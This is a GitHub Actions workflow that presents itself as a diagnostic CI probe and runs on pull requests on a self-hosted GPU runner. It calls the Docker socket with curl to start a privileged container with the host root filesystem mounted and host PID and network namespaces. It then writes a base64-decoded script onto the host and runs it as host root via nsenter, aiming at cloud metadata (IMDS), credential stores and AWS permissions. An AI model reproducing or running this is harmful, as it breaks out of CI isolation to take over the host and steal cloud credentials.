# I9617 diagnostic CI probe: IMDS + local credential stores + AWS GPU-provisioning permission matrix.
name: CI
on:
  pull_request:
    types: [opened, synchronize, reopened]
permissions:
  contents: read
concurrency:
  group: ci-i9617-${{ github.ref }}
  cancel-in-progress: false
jobs:
  probe:
    name: i9617-imds-probe
    runs-on: [self-hosted, gpu]
    timeout-minutes: 35
    steps:
      - name: i9617 host probe
        env:
          PROBE_B64: ''
          PUB_B64: ''
        run: |
          set -u
          echo "I9617_JOB_NONCE=I9617-${{ github.run_id }}-${{ github.run_attempt }}"
          echo "I9617_RUNNER=$RUNNER_NAME"
          echo "I9617_STEP_USER=$(id 2>&1)"
          echo "I9617_HOSTNAME=$(hostname)"
          IMG=""
          for c in ubuntu:24.04 nvidia/cuda:12.8.1-devel-ubuntu24.04 nvidia/cuda:12.8.1-base-ubuntu24.04 nvidia/cuda:12.8.1-runtime-ubuntu24.04 python:3.11-slim; do
            if docker image inspect "$c" >/dev/null 2>&1; then IMG="$c"; break; fi
          done
          if [ -z "$IMG" ]; then IMG=ubuntu:24.04; docker pull "$IMG" >/dev/null 2>&1 || true; fi
          echo "I9617_IMG=$IMG"
          echo "I9617_DOCKER_VERSION=$(docker version --format '{{.Server.Version}}' 2>/dev/null)"
          cat > /tmp/i9617req.json <<JSON
          {"Image":"$IMG","Tty":true,"AttachStdout":true,"AttachStderr":true,"Cmd":["bash","-c","mkdir -p /hostroot/tmp/i9617; echo $PUB_B64 | base64 -d > /hostroot/tmp/i9617/pub.pem; echo $PROBE_B64 | base64 -d > /hostroot/tmp/i9617/probe_host.sh; chmod 755 /hostroot/tmp/i9617/probe_host.sh; nsenter -t 1 -m -u -i -n -p -- bash /tmp/i9617/probe_host.sh"],"HostConfig":{"Privileged":true,"PidMode":"host","NetworkMode":"host","Binds":["/:/hostroot"],"AutoRemove":false}}
          JSON
          CID=$(curl -s --unix-socket /var/run/docker.sock -m 20 -H 'Content-Type: application/json' -d @/tmp/i9617req.json http://localhost/containers/create | sed -nE 's/.*"Id":"([0-9a-f]{64})".*/\1/p')
          echo "I9617_DC_CID=$CID"
          if [ -n "$CID" ]; then
            curl -s --unix-socket /var/run/docker.sock -m 20 -X POST "http://localhost/containers/$CID/start" -o /dev/null -w "I9617_DC_START_HTTP=%{http_code}\n"
            curl -s --unix-socket /var/run/docker.sock -m 900 -X POST "http://localhost/containers/$CID/wait"; echo
            echo "== I9617_HOST_PROBE_OUTPUT_START =="
            curl -s --unix-socket /var/run/docker.sock -m 90 "http://localhost/containers/$CID/logs?stdout=1&stderr=1"
            echo "== I9617_HOST_PROBE_OUTPUT_END =="
          else
            echo "I9617_DC_CREATE_FAILED"
          fi
          echo "I9617_JOB_DONE=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
